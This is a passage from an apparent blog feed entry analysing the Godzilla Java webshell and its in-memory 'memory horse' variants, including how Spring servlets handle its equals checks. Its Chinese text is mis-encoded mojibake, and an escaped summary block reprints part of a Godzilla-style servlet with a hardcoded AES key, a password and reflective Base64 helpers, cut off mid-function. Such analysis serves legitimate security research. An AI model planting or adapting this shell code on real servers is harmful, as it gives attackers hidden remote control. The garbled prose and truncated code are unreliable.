src="/2022/05/17/godzilla/7.png"></p><p>ç¬¬ä¸‰æ¬¡è¯·æ±‚æ˜¯è°ƒç”¨äº†<code>methodNameClose</code>å‡½æ•°ï¼Œä¸å†åˆ†æã€‚æ•´ä¸ªæµç¨‹åˆ†æä¸‹æ¥ä¼šå‘ç°å“¥æ–¯æ‹‰ä¸€å¼€å§‹å°±æŠŠä¸€ä¸ªå¤§é©¬çš„åŠŸèƒ½å®ç°å‘é€åˆ°äº†æœåŠ¡ç«¯ï¼Œä¹‹åçš„åŠŸèƒ½éƒ½æ˜¯é€šè¿‡è°ƒç”¨å¤§é©¬å®ç°å¥½çš„åŠŸèƒ½å®Œæˆçš„ã€‚</p><p>è‡³æ­¤Y4erå¸ˆå‚…çš„æ–‡ç« ç®—æ˜¯çœ‹æ‡‚äº†ï¼š<a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></p><p>åœ¨Springé‡Œé¢çš„ä¸‰ä¸ª<code>equeals</code>:</p><ul><li>f.equals(arrOut) å¿…é¡»çš„ï¼Œä½¿ç”¨ByteArrayOutputStreamè¿”å›æ‰§è¡Œçš„ç»“æœ</li><li>f.equals(data)   å¿…é¡»çš„ï¼Œæ¥æ”¶å®¢æˆ·ç«¯ä¼ è¿‡æ¥çš„å‚æ•°</li><li>f.equals(req)    éå¿…è¦ï¼Œå¯¹äºSpringçš„Servletæ˜¯éå¿…è¦çš„ï¼Œç”¨äºéšè—æ—¥å¿—ã€‚</li></ul><p>æ‰€ä»¥åœ¨Springé‡Œé¢çš„Servletï¼Œç¬¬ä¸‰ä¸ª<code>equals</code>å»æ‰ä¸å½±å“æ­£å¸¸shellåŠŸèƒ½ã€‚</p><h2 id="å‚è€ƒé“¾æ¥"><a href="#å‚è€ƒé“¾æ¥" class="headerlink" title="å‚è€ƒé“¾æ¥"></a>å‚è€ƒé“¾æ¥</h2><ul><li><a href="https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/">è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜</a></li><li><a href="https://mp.weixin.qq.com/s/lmL6XyWKClEmYgiVUspYYw">å“¥æ–¯æ‹‰æºç åˆ†æ(äºŒ)jsp shellåˆ†æ</a></li><li><a href="https://tttang.com/archive/1513/">Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°</a></li><li><a href="https://github.com/rebeyond/Behinder/issues/151">æƒ³å°è¯•ä¿®æ”¹åˆ°Spring boot å†…å­˜é©¬çš„æ”¯æŒä¸­ï¼Œè€ŒSpringæ²¡æœ‰pageContextå¯¹è±¡</a></li></ul>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;åˆ†æèƒŒæ™¯&quot;&gt;&lt;a href=&quot;#åˆ†æèƒŒæ™¯&quot; class=&quot;headerlink&quot; title=&quot;åˆ†æèƒŒæ™¯&quot;&gt;&lt;/a&gt;åˆ†æèƒŒæ™¯&lt;/h2&gt;&lt;p&gt;èµ·æºäº&lt;code&gt;Y4er&lt;/code&gt;å¸ˆå‚…å‘çš„ä¸¤ç¯‡æ–‡ç« ï¼š&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://tttang.com/archive/1513/&quot;&gt;Javaååºåˆ—åŒ–æ³¨å…¥å†°èå†…å­˜é©¬ç›¸å…³è¸©å‘ç¬”è®°&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://y4er.com/post/solve-the-problem-of-godzilla-memory-shell-pagecontext/&quot;&gt;è§£å†³å“¥æ–¯æ‹‰å†…å­˜é©¬pagecontextçš„é—®é¢˜&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;å¯¹å…¶ä¸­çš„åŸå› æ¯”è¾ƒå¥½å¥‡ï¼Œæ‰€ä»¥å°è¯•å¯¹å“¥æ–¯æ‹‰åšäº†ä¸€æ¬¡åŸç†åˆ†æï¼Œæµ‹è¯•ä»£ç åœ¨&lt;a href=&quot;https://github.com/JKme/MemoryShellDemo&quot;&gt;MemoryShellDemo&lt;/a&gt;ã€‚æ–‡ç« å¯èƒ½æœ‰é”™è¯¯çš„åœ°æ–¹ï¼Œå¯ä»¥åœ¨&lt;a href=&quot;https://github.com/JKme/JKme.github.io/issues&quot;&gt;issue&lt;/a&gt;ç•™è¨€ã€‚&lt;/p&gt;
&lt;h2 id=&quot;è¿è¡ŒåŸç†&quot;&gt;&lt;a href=&quot;#è¿è¡ŒåŸç†&quot; class=&quot;headerlink&quot; title=&quot;è¿è¡ŒåŸç†&quot;&gt;&lt;/a&gt;è¿è¡ŒåŸç†&lt;/h2&gt;&lt;p&gt;ä»å“¥æ–¯æ‹‰çš„æºä»£ç é‡Œé¢æ‰£å‡ºæ¥&lt;code&gt;godzilla\shells\payloads\java\assets\payload.classs&lt;/code&gt;æ–‡ä»¶ï¼Œä½¿ç”¨&lt;a href=&quot;https://github.com/leibnitz27/cfr&quot;&gt;https://github.com/leibnitz27/cfr&lt;/a&gt;åç¼–è¯‘ä¹‹åï¼Œåœ¨ideaé‡Œé¢æ–°å»º&lt;code&gt;payload.java&lt;/code&gt;æ–‡ä»¶ï¼Œç„¶åä¿®æ”¹è¯¯æŠ¥é”™ï¼Œ&lt;a href=&quot;https://gist.github.com/JKme/690c9562155c019570afd5ab06356658&quot;&gt;è¿™é‡Œ&lt;/a&gt;æ˜¯åç¼–è¯‘å¥½ä¹‹åçš„æ–‡ä»¶ã€‚&lt;code&gt;payload.java&lt;/code&gt;å®ç°äº†å¤§éƒ¨åˆ†çš„shellæ“ä½œï¼Œæ¯”å¦‚æŸ¥çœ‹æ–‡ä»¶ã€æ‰§è¡Œå‘½ä»¤ã€æ•°æ®åº“è¿æ¥ç­‰ç­‰&lt;/p&gt;
&lt;p&gt;æ–°å»ºä¸€ä¸ª&lt;code&gt;HelloServlet.java&lt;/code&gt;ï¼Œç”¨äºåŠ¨æ€è°ƒè¯•ï¼š&lt;/p&gt;
&lt;pre class=&quot;line-numbers language-java&quot; data-language=&quot;java&quot;&gt;&lt;code class=&quot;language-java&quot;&gt;&lt;span class=&quot;token keyword&quot;&gt;package&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;basic&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;ServletException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;annotation&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;WebServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletRequest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;javax&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;servlet&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;http&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;HttpServletResponse&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;io&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;IOException&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;lang&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;reflect&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Method&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;URL&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;net&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;URLClassLoader&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

&lt;span class=&quot;token annotation punctuation&quot;&gt;@WebServlet&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;name &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;helloServlet&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;/hello&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HelloServlet&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;extends&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;HttpServlet&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; xc &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;3c6e0b8a9c15224a&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;  &lt;span class=&quot;token comment&quot;&gt;//å®šä¹‰AESåŠ è§£å¯†çš„Keyï¼Œå“¥æ–¯æ‹‰ä¼šæŠŠè¿”å›çš„responseä¹Ÿåšä¸€æ¬¡åŠ å¯†&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; pass &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token string&quot;&gt;&quot;pass&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;       
    &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; md5 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;pass &lt;span class=&quot;token operator&quot;&gt;+&lt;/span&gt; xc&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;   &lt;span class=&quot;token comment&quot;&gt;//ç”¨äºè¿”å›responseåœ¨å¤´å’Œå°¾éƒ¨æ’å…¥æ ‡è¯†ç¬¦ï¼Œå¤´éƒ¨å–md5çš„å‰16ä½å­—ç¬¦ä¸²ï¼Œå°¾éƒ¨å–md5çš„å16ä½å­—ç¬¦ä¸²&lt;/span&gt;
    &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; payload&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;md5&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; ret &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;security&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;MessageDigest&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            m &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;security&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;MessageDigest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;MD5&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;update&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getBytes&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token number&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; s&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;length&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            ret &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;&lt;span class=&quot;token namespace&quot;&gt;java&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;math&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;BigInteger&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; m&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;digest&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toString&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;toUpperCase&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;return&lt;/span&gt; ret&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
    &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;

    &lt;span class=&quot;token keyword&quot;&gt;public&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;static&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; &lt;span class=&quot;token function&quot;&gt;base64Encode&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt; bs&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;throws&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt; value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;java.util.Base64&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;getEncoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;base64&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
            value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;encodeToString&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
        &lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;catch&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Exception&lt;/span&gt; e&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
            &lt;span class=&quot;token keyword&quot;&gt;try&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;
                base64 &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;forName&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;sun.misc.BASE64Encoder&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; base64&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;newInstance&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
                value &lt;span class=&quot;token operator&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;String&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getClass&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;getMethod&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token string&quot;&gt;&quot;encode&quot;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;byte&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token keyword&quot;&gt;class&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;token function&quot;&gt;invoke&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token class-name&quot;&gt;Encoder&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token keyword&quot;&gt;new&lt;/span&gt; &lt;span class=&quot;token class-name&quot;&gt;Object&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;&amp;#123;&lt;/span&gt;bs&lt;span class=&quot;token punctuation&quot;&gt;&amp;#125;&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;;&lt;/span&gt;
